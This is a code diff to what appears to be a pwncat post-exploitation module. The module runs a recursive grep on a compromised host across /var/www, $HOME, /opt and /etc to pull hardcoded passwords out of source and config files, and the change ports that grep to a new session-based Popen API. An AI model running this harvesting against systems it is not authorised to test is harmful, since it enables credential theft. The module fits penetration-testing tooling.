@@ -20,7 +20,7 @@ class Module(EnumerateModule):
     PLATFORM = [Linux]
     SCHEDULE = Schedule.PER_USER
 
-    def enumerate(self):
+    def enumerate(self, session):
 
         # The locations we will search in for passwords
         locations = ["/var/www", "$HOME", "/opt", "/etc"]
@@ -29,17 +29,25 @@ class Module(EnumerateModule):
         # The types of files which are "code". This means that we only recognize the
         # actual password if it is a literal value (enclosed in single or double quotes)
         code_types = [".c", ".php", ".py", ".sh", ".pl", ".js", ".ini", ".json"]
-        grep = pwncat.victim.which("grep")
+        # grep = pwncat.victim.which("grep")
+        grep = "grep"
 
         if grep is None:
             return
 
         command = f"{grep} -InriE 'password[\"'\"'\"']?\\s*(=>|=|:)' {' '.join(locations)} 2>/dev/null"
-        with pwncat.victim.subprocess(command, "r") as filp:
+
+        # Run the command on the remote host
+        proc = session.platform.Popen(
+            command, shell=True, text=True, stdout=pwncat.subprocess.PIPE
+        )
+
+        # Iterate through the output
+        with proc.stdout as filp:
             for line in filp:
                 try:
                     # Decode the line and separate the filename, line number, and content
-                    line = line.decode("utf-8").strip().split(":")
+                    line = line.strip().split(":")
                 except UnicodeDecodeError:
                     continue
 
@@ -108,3 +116,5 @@ class Module(EnumerateModule):
                 # This was a match for the search. We  may have extracted a
                 # password. Either way, log it.
                 yield "creds.password", PasswordData(password, path, lineno)
+
+        proc.wait()
